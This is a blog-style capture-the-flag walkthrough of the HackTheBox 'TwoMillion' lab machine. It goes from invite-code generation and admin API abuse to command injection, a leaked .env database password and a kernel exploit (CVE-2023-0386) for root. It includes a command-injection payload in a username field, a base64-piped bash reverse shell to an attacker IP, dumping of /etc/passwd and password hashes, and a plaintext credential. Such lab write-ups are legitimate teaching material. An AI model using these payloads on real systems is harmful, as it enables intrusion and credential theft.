---
layout: post
title: TwoMillion - HackTheBox
categories:
- HackTheBox
tags:
- javascript
- API
- Command Injection
- linux
- spool
- OverlayFS
- mysql
date: 2023-09-09
description: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.
summary: TwoMillion is an Easy difficulty Linux box that was released to celebrate reaching 2 million users on HackTheBox. The box features an old version of the HackTheBox platform that includes the old hackable invite code. After hacking the invite code an account can be created on the platform. The account can be used to enumerate various API endpoints, one of which can be used to elevate the user to an Administrator. With administrative access the user can perform a command injection in the admin VPN generation endpoint thus gaining a system shell. An .env file is found to contain database credentials and owed to password re-use the attackers can login as user admin on the box. The system kernel is found to be outdated and CVE-2023-0386 can be used to gain a root shell.
cover:
  image: images/machine_img.png
---

## Recon

It seems like the machine has only two ports available, 22(SSH) and 80(HTTP). 

```shell
$ nmap -A -oN nmap.txt 10.10.11.221

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/

```
The port 80 redirects to 2million.htb so lets add the vhost to the hosts file(/etc/hosts) and head to the website.

`echo '10.10.11.221 2million.htb' | sudo tee -a /etc/hosts`

The website site seems like a copy from hackthebox old website.
We perform a directory scan using nikto and gobuster.

`nikto -h http://2million.htb`

`gobuster dir -u http://2million.htb -w ~/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -b 301`

Going to the register endpoint found by the scan, it seems like it needs a invite code in order to register. One endpoint found by gobuster /invite, seems a bit peculiar and fits in the situation.

Looking in the Developer console, I notice a javascript function called "makeInviteCode". Using a web tool called [de4js](https://lelinhtinh.github.io/de4js/) to deobfuscate the javascript file inviteapi.min.js we get the following:

```javascript
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

Using curl to make the request: `curl -X POST http://2million.htb/api/v1/invite/how/to/generate`
We get: `{"0":200,"success":1,"data":{"data":"Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb \/ncv\/i1\/vaivgr\/trarengr","enctype":"ROT13"},"hint":"Data is encrypted ... We should probbably check the encryption type in order to decrypt it..."}`

It gives: `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`
Doing a POST request to it we get: `{"0":200,"success":1,"data":{"code":"RFc2TVktNzc5WlYtR1hENFYtSUY5OUk=","format":"encoded"}}`
Then: `echo RFc2TVktNzc5WlYtR1hENFYtSUY5OUk= | base64 -d`, we get the invite code: `DW6MY-779ZV-GXD4V-IF99I`

We create an account and login. Going around the page we are able to open the "Access" page. The source code pointed an API endpoint to the connection pack button`/api/v1/user/vpn/generate`
Before start fuzzing, lets look at `http://2million.htb/api/v1` and see if we found some information about the API.

We get a list of endpoints!!!

![](/images/twomillion/apis.png)


Even the admin endpoints which is very bad security. Lets try to use the admin endpoints to make us, admins!
Using `/api/v1/admin/auth` we see that our account is not admin user. Lets see if the endpoint `/api/v1/admin/settings/update` gets us there.
To developed the payload we used burpsuite. We capture a request, send it to repeater and start modifying the request.
After tinkering around the request the final request that change the user to admin is:

![](/images/twomillionadmin.png)

We can see that it is true if we access: `http://2million.htb/api/v1/admin/auth`.

## Foothold

The endpoint, `/api/v1/admin/vpn/generate`, it's the only one that it seems like interacting with the operating system.
Why? Because the endpoint generates a vpn for a user and this vpn needs to be saved in the system to be able to work. Another good hint is that we can interact with it.

Trying a few [command injections](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection#exploits) we get a command injection vulnerability once we had `"username": "admin;ls -la;"`.

![](/images/twomillionburp_rce.png)

Since we have command injection the next step is to find a way to get a shell inside the target machine. We can try to use netcat and other ways to get a reverse shell. However we see that the directory has a `.env` file which is common to save envirnoment variables.

.env file:

DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123

Lets see what users do we have by looking at the passwd file.

/etc/passwd file:

```bash
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
mysql:x:114:120:MySQL Server,,,:/nonexistent:/bin/false
admin:x:1000:1000::/home/admin:/bin/bash
memcache:x:115:121:Memcached,,,:/nonexistent:/bin/false
_laurel:x:998:998::/var/log/laurel:/bin/false
```

We have only one user besides root, which is admin. We know this because it the only one who has a /bin/bash shell assign to it. Additionaly, it is the user that is specified in the .env file. For our luck it has a plaintext password which is bad security. Lets try to connect to with the user and pass: `ssh admin@10.10.11.221`

Using the reverse shell method to get a shell we can do the following steps:

1. Create a listener with `nc -lvp 1234`
2. Encode to base64 the following payload: `bash -i >& /dev/tcp/<your_IP>/1234 0>&1`
3. Then add the `{"username":"test;echo $BASE64_BASH_PAYLOAD | base64 -d | bash;"}`
4. We should get a shell as www-data, we can then get lateral movement by looking at the file with the username and password

We get a SHEELL!
To get all the files used by the application we used the command: `scp -r  admin@10.10.11.221:/var/www/html/ .`
Looking at how the command injection is done the following line is when we send the request with the username payload: ` exec("/bin/bash /var/www/html/VPN/gen.sh $user", $output, $return_var);`

### Database

We know that a database is running supporting the application. Lets see if the database has useful informations.
To connect to it, use the following commands:

```
mysql -u admin -p <admin_password>
use htb_prod
show tables;
```

We got two tables, user and invite_codes
Users table is the most important and has the following users:

```
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| id | username     | email                      | password                                                     | is_admin |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
| 11 | TRX          | trx@hackthebox.eu          | $2y$10$TG6oZ3ow5UZhLlw7MDME5um7j/7Cw1o6BhY8RhHMnrr2ObU3loEMq |        1 |
| 12 | TheCyberGeek | thecybergeek@hackthebox.eu | $2y$10$wATidKUukcOeJRaBpYtOyekSpwkKghaNYr5pjsomZUKAd0wbzw4QK |        1 |
| 13 | test         | test@2million.htb          | $2y$10$eyOtifAxQpGUbGoJ83N0.eSt4WSCaZrwUTDHFp69a0kwujG3Fl6n2 |        1 |
| 14 | admin        | admin@email.com            | $2y$10$0jw5FRXIJeD6wxDr5qWfreB17Mg/tUaN1fxZmHt6KB9qgByYSrcIy |        1 |
| 15 | zNetlux      | znetlux@gmail.com          | $2y$10$ZI5XrBcwe396TGmyWQyc7OAI8DBLrdltEQa3brET4uiPKfTuWmwQS |        0 |
+----+--------------+----------------------------+--------------------------------------------------------------+----------+
```

Since we didnt get any additional information, lets run linpeas!

## Privilege Escalation

Linpeas is a very common tool to find ways to do privilege escalation. Running it in the target machine we found a peculiar thing in the report. This finding is the presence of a file in the spool directory.

```
╔══════════╣ Mails (limit 50)
271      4 -rw-r--r--   1 admin    admin         540 Jun  2 23:20 /var/mail/admin
271      4 -rw-r--r--   1 admin    admin         540 Jun  2 23:20 /var/spool/mail/admin
```

The files have the following text:

```
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather

```

### Vulnerability

The vulnerability in question is [CVE-2023-0386](https://securitylabs.datadoghq.com/articles/overlayfs-cve-2023-0386/).
In order to exploit this vulnerability we have forked a [poc](https://github.com/w0r7h/CVE-2023-0386).
Just compile all the files, zip it and send to the target machine.

Then run the steps presented in the poc README and we get root.
